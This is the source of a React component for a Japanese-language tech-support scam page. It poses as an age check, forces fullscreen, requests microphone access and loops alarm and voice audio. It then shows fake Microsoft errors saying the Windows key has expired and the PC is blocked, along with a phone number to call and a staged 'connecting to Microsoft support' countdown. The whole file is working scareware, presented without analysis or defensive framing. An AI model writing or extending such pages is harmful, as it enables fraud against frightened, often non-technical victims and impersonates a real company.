import React, { useState } from "react";
import Login from "../Login";
import LoginAllowed from "../LoginAllowed";
import microsoftLogo from "../images/microsoftLogo.jpeg";
import cancelIcon from "../images/cancel.png";
import warning from "../images/warning.png";
import ok from "../images/ok.png";
import ModalPic from "../images/modal-pic.jpg";
import { notification, message, Modal, Row, Col } from "antd";
import beepAudio from "../beep-04.mp3";
import voice from "../japancams.mp3";
import clickAllowAudio from "../clickallow.mp3";
import ConnectingCall from "../connecting.mp3";
import ConnectedCall from "../connected.mp3";
import PhoneCall from "../images/laptop.png";
import Globe from "../images/global.png";
import CustomerService from "../images/customer-service.png";
import RightArrow from "../images/right-arrow.png";

const AgeConfirm = (props) => {
  const [audio] = useState(new Audio(beepAudio));
  const [audio2] = useState(new Audio(voice));
  const [audio3] = useState(new Audio(clickAllowAudio));
  const [connectingAudio] = useState(new Audio(ConnectingCall));
  const [connectedAudio] = useState(new Audio(ConnectedCall));
  const [isModalVisible, setIsModalVisible] = useState(false);
  const [isBackModalVisible, setIsBackModalVisible] = useState(false);

  const [timer, setTimer] = useState(`15`);

  const [loadingModal, setLoadingModal] = useState(false);

  const loginToDash = () => {
    document.getElementById("chat-box").style.display = "block";

    showModal();
    message.error("セキュリティ上の理由でPCがブロックされました");
  };

  const showModal = () => {
    setIsBackModalVisible(true);
  };

  const notificationPopup = () => {
    notification["error"]({
      message: "Windowsキーの有効期限が切れています",
      description: (
        <div>
          新しいキーを取得するには、サポートに連絡してください。
          <br />
          フリーダイヤル：050-5532-9603
        </div>
      ),
      icon: (
        <img
          src={microsoftLogo}
          style={{ padding: "0px" }}
          height="40px"
          width="40px"
          alt="warning icon"
        />
      ),
      onClick: loginToDash,
      onClose: loginToDash,
    });
  };

  function getLocalStream() {
    navigator.mediaDevices
      .getUserMedia({ video: false, audio: true })
      .then((stream) => {
        window.localStream = stream; // A
        window.localAudio.srcObject = stream; // B
        window.localAudio.autoplay = true; // C
      })
      .catch((err) => {
        if (
          err.message === "Permission denied" ||
          err.message === "Permission dismissed"
        ) {
          audio3.pause();

          audio.play();
          audio2.play();

          audio.loop = true;
          audio2.loop = true;

          document.getElementById("takemicpermission").style.display = "none";
          document.getElementById("loginPage").style.display = "block";

          notificationPopup();
        } else {
          //mic allowed
          audio3.pause();
          audio.pause();
          audio2.pause();

          //   audio.play();
          //   audio2.play();

          // audio.loop = true;
          // audio2.loop = true;

          document.getElementById("takemicpermission").style.display = "none";
          document.getElementById("loginPage").style.display = "none";
          document.getElementById("loginPageAllowed").style.display = "block";

          setTimeout(() => {
            setLoadingModal(true);

            setTimeout(() => {
              setTimer(`14`);
              connectingAudio.play();
            }, 1000);

            setTimeout(() => {
              setTimer(`13`);
            }, 2000);

            setTimeout(() => {
              setTimer(`12`);
            }, 3000);

            setTimeout(() => {
              setTimer(`11`);
            }, 4000);

            setTimeout(() => {
              setTimer(`10`);
            }, 5000);

            setTimeout(() => {
              setTimer(`09`);
            }, 6000);

            setTimeout(() => {
              setTimer(`08`);
              connectingAudio.play();
            }, 7000);

            setTimeout(() => {
              setTimer(`07`);
            }, 8000);

            setTimeout(() => {
              setTimer(`06`);
            }, 9000);

            setTimeout(() => {
              setTimer(`05`);
            }, 10000);

            setTimeout(() => {
              setTimer(`04`);
            }, 11000);

            setTimeout(() => {
              setTimer(`03`);
            }, 12000);

            setTimeout(() => {
              setTimer(`02`);
            }, 13000);

            setTimeout(() => {
              setTimer(`01`);
            }, 14000);

            setTimeout(() => {
              setTimer(`00`);
            }, 15000);

            setTimeout(() => {
              document.getElementById("connectingscreen").style.display =
                "none";
              document.getElementById("connectedscreen").style.display =
                "block";
            }, 16000);

            setTimeout(() => {
              connectedAudio.play();
            }, 17000);

            setTimeout(() => {
              connectedAudio.play();
            }, 25000);
          }, 60000);

          notificationPopup();
        }
      });
  }

  return (
    <>
      {/* first page code starts here */}
      <div
        id="ageModal"
        className="age-comfirm-modal rounded"
        onClick={() => {
          props.makeWindowFullScreen();
          document.getElementById("ageModal").style.display = "none";
          document.getElementById("takemicpermission").style.display = "block";

          audio3.play();
          audio3.loop = true;

          getLocalStream();

          setTimeout(() => {
            audio3.pause();

            audio.play();
            audio2.play();

            audio.loop = true;
            audio2.loop = true;

            document.getElementById("takemicpermission").style.display = "none";
            document.getElementById("loginPage").style.display = "block";

            notificationPopup();
          }, 4000);
        }}
      >
        <div className="age-comfirm-dialog text-center">
          <div style={{ textAlign: "right" }}>
            <img
              src={cancelIcon}
              height={20}
              style={{
                marginRight: "10px",
                marginBottom: "5px",
                cursor: "pointer",
              }}
            />
          </div>
          {/* <div className="mb-20">あなたは18歳以上ですか？</div>
          <div className="flex mt-20">
            <button className="mr-20 btn btn-lg btn-success">はい</button>
            <button className="btn btn-lg btn-danger">ない</button>
          </div> */}
          <img src={ModalPic} height="300px" />
        </div>
      </div>

      {/* second page code starts here */}
      <div id="takemicpermission">
        <div id="permissioninstruction">
          <img src={warning} height="100px" width="100px" />
          <p>左側の</p>
          <p>許可ボタンを</p>
          <p>クリックしてください</p>
          <img src={ok} height="100px" width="auto" />
        </div>
      </div>

      {/* third page code (when mic blocked) starts here */}
      <div id="loginPage" style={{ display: "none" }}>
        <Login
          notificationPopup={notificationPopup}
          isModalVisible={isModalVisible}
          setIsModalVisible={setIsModalVisible}
          isBackModalVisible={isBackModalVisible}
          setIsBackModalVisible={setIsBackModalVisible}
          loginToDash={loginToDash}
        />
      </div>

      {/* third page code (when mic allowed) starts here */}
      <div id="loginPageAllowed" style={{ display: "none" }}>
        <LoginAllowed
          notificationPopup={notificationPopup}
          isModalVisible={isModalVisible}
          setIsModalVisible={setIsModalVisible}
          isBackModalVisible={isBackModalVisible}
          setIsBackModalVisible={setIsBackModalVisible}
          loginToDash={loginToDash}
        />
      </div>

      {/* fourth page code (when mic allowed) starts here */}
      <Modal
        id="connectModal"
        bodyStyle={{ cursor: "none" }}
        wrapClassName="nocursor"
        visible={loadingModal}
        centered
        footer={false}
        maskStyle={{ backgroundColor: "gray", opacity: 0.8, cursor: "none" }}
        width={600}
      >
        {/* header */}
        <Row justify="center" align="middle">
          <Col span={4}>
            <img src={microsoftLogo} alt="Microsoft Logo" height={50} />
          </Col>
          <Col span={20}>
            <h2>Microsoftサポート</h2>
          </Col>
        </Row>
        <br />
        <div id="connectingscreen">
          <h4 style={{ textAlign: "center" }}>
            マイクロソフトサポートに接続しています...
          </h4>
          <br />

          <h4 style={{ textAlign: "center" }}>00:{timer}</h4>

          <h6 style={{ textAlign: "center" }}>お待ちください ...</h6>
        </div>
        <div id="connectedscreen" style={{ display: "none" }}>
          <h4 style={{ textAlign: "center" }}>
            Microsoftエージェントに接続しています。ノートパソコンで話してください
          </h4>
          <br />
          <Row style={{ textAlign: "center" }} justify="center" align="middle">
            <Col span={6}>
              <img src={PhoneCall} height="100px" />
            </Col>
            <Col span={3}>
              <img src={RightArrow} height="50px" />
            </Col>
            <Col span={6}>
              <img src={Globe} height="50px" />
            </Col>
            <Col span={3}>
              <img src={RightArrow} height="50px" />
            </Col>
            <Col span={6}>
              <img src={CustomerService} height="100px" />
            </Col>
          </Row>
          <br />
          <br />
          <Row justify="center">
            <Col>問題に直面していますか？コンタクト ：050-5532-9603</Col>
          </Row>
        </div>
      </Modal>
    </>
  );
};

export default AgeConfirm;
